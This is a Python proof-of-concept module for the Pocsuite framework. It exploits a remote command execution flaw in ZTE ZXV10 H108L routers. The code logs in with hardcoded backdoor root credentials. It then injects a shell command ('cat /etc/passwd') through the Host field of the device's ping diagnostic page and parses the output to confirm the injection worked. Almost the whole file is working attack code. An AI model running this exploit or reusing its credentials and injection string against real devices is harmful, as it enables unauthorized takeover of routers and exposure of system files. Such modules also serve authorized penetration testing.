#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re
import time





class TestPOC(POCBase):
    name = "ZTE ZXV10 RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'RCE'
    version = '1.0'  # default version: 1.0
    references = 'https://github.com/stasinopoulos/ZTExploit/'
    desc = 'Exploits ZTE ZXV10 H108L remote code execution vulnerability that allows executing commands on operating system level.'

    vulDate = ''
    createDate = '2017-10-26'
    updateDate = '2017-10-26'

    appName = 'ZTE'
    appVersion = 'ZXV10 H108L'
    dork = ''
    appPowerLink = ''
    samples = []

    def _attack(self):
        result = {}
        url = self.url
        username = 'root'
        password = 'W!n0&oO7.'
        resp = req.get(url)
        if resp:
            Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', resp.content)
            if Frm_Logintoken:
                Frm_Logintoken = Frm_Logintoken[0]
                url1 = self.url + '/login.gch'
                data = {"Frm_Logintoken": Frm_Logintoken,
                        "Username": username,
                        "Password": password}
                s = req.Session()
                resp1 = s.post(url1, data=data)
                if "Username" not in resp1.content and "Password" not in resp1.content:
                    cmd = 'cat /etc/passwd'
                    path = "/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch&Host=;echo $({})&NumofRepeat=1&" \
                           "DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit".format(cmd)
                    url1= self.url + path
                    resp2 = s.get(url1)
                    time.sleep(1)

                    res = re.findall(r'textarea_1">(.*) -c', resp2.content)
                    if len(res) and 'root' in res:
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = url1
                    else:
                        res1 = re.findall(r'textarea_1">(.*)', resp2.content)
                        if res1[0] == "-c 1 -s 64":
                            return ""
                        else:
                            res2 = re.findall(r'(.*) -c', resp2.content)
                            res = res1 + res2
                            if res[0] != "</textarea>":
                                result['VerifyInfo'] = {}
                                result['VerifyInfo']['URL'] = url1


        return self.parse_output(result)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url
        username = 'root'
        password = 'W!n0&oO7.'
        resp = req.get(url)
        if resp:
            Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', resp.content)
            if Frm_Logintoken:
                Frm_Logintoken = Frm_Logintoken[0]
                url1 = self.url +'/login.gch'
                data = {"Frm_Logintoken": Frm_Logintoken,
                        "Username": username,
                        "Password": password}
                resp1 = req.post(url1,data=data)
                if "Username" not in resp1.content and "Password" not in resp1.content:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url1
                    result['VerifyInfo']['Username'] = username
                    result['VerifyInfo']['Password'] = password



        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
